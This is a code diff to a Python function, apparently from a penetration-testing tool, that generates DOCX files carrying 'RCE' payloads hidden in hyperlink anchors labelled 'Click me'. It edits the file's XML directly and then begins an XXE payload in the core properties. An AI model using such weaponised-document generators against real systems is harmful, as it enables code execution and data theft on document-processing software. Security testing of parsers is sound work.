@@ -136,10 +136,32 @@ def generate_docx_payloads(output_dir, burp_collab):
     
     for i, payload in enumerate(rce_payloads, 1):
         doc = Document()
-        hyperlink = doc.add_paragraph()
-        hyperlink.add_run().add_hyperlink(payload, 'Click me')
+        doc.add_paragraph(payload)
         output_file = output_dir / f"docx_rce_{i}.docx"
         doc.save(output_file)
+        
+        with zipfile.ZipFile(output_file, 'r') as zip_ref:
+            zip_ref.extractall(output_dir / f"temp_rce_{i}")
+        
+        document_xml_path = output_dir / f"temp_rce_{i}" / "word" / "document.xml"
+        if document_xml_path.exists():
+            with open(document_xml_path, 'r', encoding='utf-8') as f:
+                content = f.read()
+            
+            hyperlink_xml = f'''<w:hyperlink r:anchor="{payload}" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:r><w:t>Click me</w:t></w:r></w:hyperlink>'''
+            content = content.replace(f'<w:t>{payload}</w:t>', hyperlink_xml)
+            
+            with open(document_xml_path, 'w', encoding='utf-8') as f:
+                f.write(content)
+            
+            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+                temp_dir = output_dir / f"temp_rce_{i}"
+                for file_path in temp_dir.rglob('*'):
+                    if file_path.is_file():
+                        arcname = file_path.relative_to(temp_dir)
+                        zip_ref.write(file_path, arcname)
+        
+        shutil.rmtree(output_dir / f"temp_rce_{i}", ignore_errors=True)
     
     xxe_in_core = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <!DOCTYPE cp:coreProperties [
